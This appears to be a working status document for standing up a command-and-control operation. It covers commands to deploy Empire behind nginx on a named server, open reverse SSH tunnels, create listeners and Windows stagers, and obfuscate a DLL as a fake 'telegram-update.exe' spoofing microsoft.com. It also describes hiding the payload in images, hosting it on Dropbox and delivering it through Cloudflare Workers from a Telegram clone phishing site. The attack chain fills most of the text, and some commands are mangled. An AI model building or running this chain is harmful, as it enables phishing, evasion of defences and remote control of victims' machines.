# C2 Framework - Current Status & Action Items

## CURRENT SITUATION

### What's Working
- Local Kali machine configured
- Digital Ocean droplet accessible: `161.35.155.3`
- nginx proxy configured on droplet
- Domain ready: `161-35-155-3.sslip.io`
- SSH access working: `ssh root@161.35.155.3`
- Stegan graphy phishing system code complete
- ScareCrow payload generator ready
- Cloudflare Workers code written
- Empire launcher GUI functional

### ️ Current Issues
- Empire installation has Python 2/3 compatibility issues
- Dependencies need to be properly resolved
- Listeners not yet configured
- Stagers not yet generated
- nginx not yet configured for Empire/Starkiller

## IMMEDIATE ACTIONS REQUIRED

### Priority 1: Fix Empire Installation (30 mins)

The `/opt/Empire` installation has Python 2 syntax in the main launcher. Two solutions:

#### Option A: Use Docker (RECOMMENDED - 5 mins)
```bash
# Pull BC-SECURITY Empire Docker image
docker pull bcsecurity/empire:latest

# Run Empire server
docker run -d --name empire \\
 -p 1337:1337 \\
 -p 5000:5000 \\
 -v /home/kali/Main\ C2\ Framework/empire-dataroot/.local/share/powershell-empire \\
 bcsecurity/empire:latest

# Access Empire CLI
docker exec -it empire powershell-empire client

# Check API
curl http/127.0.0.1:1337/api/v2/meta/version
```

#### Option B: Install via pip (CLEAN INSTALL)
```bash
# Remove old installation
sudo rm -rf /opt/Empire

# Install via pipx (isolated environment)
pipx install powershell-empire

# Or use python venv
python3 -m venv /opt/empire-venv
source /opt/empire-venv/bin/activate
pip install powershell-empire
empire server
```

### Priority 2: Configure nginx on Digital Ocean (15 mins)

```bash
# SSH to droplet
ssh root@161.35.155.3

# Create Empire nginx config
cat > /etc/nginx/sites-available/empire << 'EOF'
upstream empire_api {
 server 127.0.0.1:1337;
}

upstream starkiller {
 server 127.0.0.1:5000;
}

server {
 listen 443 ssl http2;
 server_name 161-35-155-3.sslip.io;

 # SSL configuration (if certificates exist)
 ssl_certificate /etc/ssl/certs/empire.crt;
 ssl_certificate_key /etc/ssl/private/empire.key;

 # Or use self-signed for testing
 # ssl_certificate /etc/nginx/ssl/nginx.crt;
 # ssl_certificate_key /etc/nginx/ssl/nginx.key;

 # Starkiller UI
 location / {
 proxy_pass http/starkiller;
 proxy_http_version 1.1;
 proxy_set_header Upgrade $http_upgrade;
 proxy_set_header Connection 'upgrade';
 proxy_set_header Host $host;
 proxy_cache_bypass $http_upgrade;
 }

 # Empire API
 location /api {
 proxy_pass http/empire_api;
 proxy_http_version 1.1;
 proxy_set_header X-Real-IP $remote_addr;
 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
 proxy_set_header Host $host;
 }

 # WebSocket support
 location /socket.io {
 proxy_pass http/empire_api;
 proxy_http_version 1.1;
 proxy_set_header Upgrade $http_upgrade;
 proxy_set_header Connection "upgrade";
 }
}

server {
 listen 80;
 server_name 161-35-155-3.sslip.io;
 return 301 https/$server_name$request_uri;
}
EOF

# Generate self-signed cert for testing
sudo mkdir -p /etc/nginx/ssl
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\
 -keyout /etc/nginx/ssl/nginx.key \\
 -out /etc/nginx/ssl/nginx.crt \\
 -subj "/CK/ST=Copenhagen/L=Copenhagen/O=Research/CN=161-35-155-3.sslip.io"

# Enable site
sudo ln -s /etc/nginx/sites-available/empire /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

### Priority 3: Setup SSH Tunnels (5 mins)

From your Kali machine, forward Empire to the droplet:

```bash
# Terminal 1: Forward Empire API
ssh -R 13371337 -N root@161.35.155.3

# Terminal 2: Forward Starkiller UI
ssh -R 50005000 -N root@161.35.155.3

# Or combined
ssh -R 13371337 -R 50005000 root@161.35.155.3
```

### Priority 4: Create Listeners (10 mins)

Once Empire is running:

```python
# Start Empire CLI
docker exec -it empire powershell-empire client

# Or if installed locally
powershell-empire client

# Create HTTP listener
uselistener http
set Name main_http
set Host https/161-35-155-3.sslip.io
set Port 443
set DefaultProfile /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 10.0; Win64; x64)
execute

# Verify listener
listeners
```

### Priority 5: Generate Stagers (10 mins)

```python
# Windows PowerShell stager
usestager windows/launcher_bat
set Listener main_http
set OutFile /opt/stagers/launcher.bat
execute

# Windows DLL for ScareCrow
usestager windows/dll
set Listener main_http
set OutFile /opt/stagers/empire.dll
execute

# Verify stagers
ls /opt/stagers/
```

## COMPLETE WORKFLOW

Once the above is complete:

### 1. Test Empire Connectivity
```bash
# From Kali (local)
curl http/127.0.0.1:1337/api/v2/meta/version

# From internet (via droplet)
curl https/161-35-155-3.sslip.io/api/v2/meta/version
```

### 2. Generate Obfuscated Payloads
```bash
cd /home/kali/ScareCrow
./ScareCrow \\
 -I /opt/stagers/empire.dll \\
 -Loader binary \\
 -domain microsoft.com \\
 -O /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe
```

### 3. Embed in Steganography System
```bash
cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing
python3 large-stego-system.py embed \\
 --payload /home/kali/Main\ C2\ Framework/payloads/telegram-update.exe \\
 --carrier-image ./images/telegram-hero.png \\
 --output ./output/telegram-hero-payload.png
```

### 4. Upload to Dropbox
```bash
# Use Dropbox API or web interface
# Upload embedded images to public folder
# Get public share links
```

### 5. Deploy Cloudflare Workers
```bash
cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing/workers
wrangler publish enhanced-telegram-delivery.js
```

### 6. Test Complete Attack Chain
```bash
# 1. Visit phishing site (telegram clone)
# 2. Click download button
# 3. Cloudflare worker delivers payload
# 4. Payload extracts from steganographic image
# 5. ScareCrow loader executes
# 6. Empire stager runs
# 7. Agent checks in to C2
```

## VERIFICATION CHECKLIST

- [ ] Empire server responds to API calls
- [ ] Starkiller UI loads in browser
- [ ] nginx proxy forwards traffic correctly
- [ ] Listeners show as active in Empire
- [ ] Stagers generate successfully
- [ ] ScareCrow creates obfuscated payloads
- [ ] Steganography embedding works
- [ ] Dropbox links accessible
- [ ] Cloudflare workers deployed
- [ ] Test agent checks in from VM

## ⏱️ ESTIMATED TIME TO OPERATIONAL

- Empire Docker setup: 5 minutes
- nginx configuration: 15 minutes
- SSH tunnel setup: 5 minutes
- Listener creation: 10 minutes
- Stager generation: 10 minutes
- Payload obfuscation: 15 minutes
- Steganography embedding: 20 minutes
- Worker deployment: 10 minutes
- Testing: 30 minutes

**TOTAL: ~2 hours to fully operational**

## ️ QUICK START COMMAND

```bash
# Run this to get Empire up quickly
cd /home/kali/Main\ C2\ Framework/advanced-steganography-phishing
docker pull bcsecurity/empire:latest
docker run -d --name empire -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest

# Wait 30 seconds for startup
sleep 30

# Test
curl http/127.0.0.1:1337/api/v2/meta/version

# If working, proceed with nginx setup on droplet
```

## NOTES

- Empire Docker image is the fastest path to working C2
- nginx configuration can be tested with self-signed certs
- SSH tunnels work immediately for development
- Production deployment should use proper SSL certs
- All components are ready except Empire server itself
- Once Empire is running, everything else falls into place

## CRITICAL PATH

1. Get Empire running (Docker recommended)
2. Configure nginx on droplet
3. Setup SSH tunnels
4. Create listeners
5. Generate stagers
6. Everything else flows from there

---

**Current Blocker**: Empire installation Python 2/3 compatibility
**Recommended Solution**: Use Docker image
**Time to Resolution**: 5 minutes
**Next Action**: Run Docker command above
